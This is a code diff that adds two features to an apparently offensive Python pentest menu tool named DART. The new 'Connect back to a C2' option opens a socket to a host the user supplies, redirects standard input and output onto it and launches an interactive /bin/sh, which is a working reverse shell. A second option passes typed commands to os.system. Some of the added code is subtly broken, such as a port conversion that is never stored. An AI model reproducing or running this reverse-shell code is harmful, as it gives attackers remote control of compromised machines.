@@ -5,6 +5,8 @@ import platform
 from colorama import Fore
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from html import escape
+import subprocess
+
 
 class banner:
     def __init__(self,banner1,banner2,banner3):
@@ -40,6 +42,7 @@ class MyServer(BaseHTTPRequestHandler):
         self.wfile.write(bytes("</body></html>", "utf-8"))
 
 
+
 menu.nmap = """ 
 NMAP Menu 
 
@@ -57,9 +60,11 @@ menu.main = """
 
 [1] Nmap Interface 
 [2] Start Python Http Server 
-[3] Shell Maker
+[3] Shell maker
 [4] Shell Handler
 [5] Info for nerds
+[6] Connect back to a C2
+[7] OS Shell (Self)
 
 """
 
@@ -180,8 +185,33 @@ def opt_5():
     print(f"PyVer :{platform.python_version()}")
     flow_handler()
 
+def opt_6():
+    host = input("Hostname to connect \n DART>")
+    port = input ("port \n DART>")
+    int(port)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    p = subprocess.call(["/bin/sh", "-i"])
+
+def opt_7():
+    clear()
+    run = True
+    while run:
+        print("Interact with your OS shell type b to go back \n")
+        
+        cmdline = input("\nDART> ")
+        chk = os.system(cmdline)
+        if chk == "b":
+            run = False
+
+
+
 def main():
     clear()
+
 
     cntrl_main = True
     while cntrl_main:
@@ -190,7 +220,7 @@ def main():
         print(Fore.GREEN +banner.banner1)
         print(Fore.RED + banner.banner2)
         print(Fore.RESET)
-        print(f"Host: {platform.node()}")
+        print(f"Host: {platform.node()}") 
         print(platform.system())
         print("Windows is not Reccmmended"if os.name== "nt" else"")
 
@@ -199,6 +229,7 @@ def main():
         choose = input("DART>")
         clear()
         
+
         match choose: 
             case "1":
                 opt_1() #Nmap interface
@@ -215,5 +246,11 @@ def main():
             case "5":
                 opt_5() # Nerdy stuff
                 continue
-            
+            case "6":
+                opt_6()
+            case "7":
+                opt_7()
+
+
+
 main()
